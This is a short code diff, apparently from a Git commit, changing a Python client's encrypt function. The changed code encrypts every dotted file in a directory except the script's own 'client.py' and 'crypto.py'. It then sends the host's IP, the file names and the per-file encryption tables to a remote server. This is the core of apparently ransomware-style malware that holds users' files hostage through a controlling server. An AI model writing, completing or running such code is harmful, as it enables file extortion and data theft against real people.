@@ -19,16 +19,17 @@ def encrypt(server) :
     file_list = os.listdir(dir_path)
     table_list = []
 
-    for file in file_list :
-        result, table = ct.encrypt_file(dir_path + "/" + file)
+    for i in range(len(file_list)) :
+        if "." in file_list[i] and not file_list[i] in ["client.py", "crypto.py"] :
+            result, table = ct.encrypt_file(dir_path + "/" + file_list[i])
 
-        table_list.append(table)
+            table_list.append([file_list[i], table])
 
     server.emit("data", json.dumps([{
         "ip" : ip,
-        "file" : file_list[i],
-        "table" : table_list[i]
-    } for i in range(len(file_list))]))
+        "file" : table_list[i][0],
+        "table" : table_list[i][1]
+    } for i in range(len(table_list))]))
 
 def decrypt(server) :
     table = server.data[1:-1].split(",")
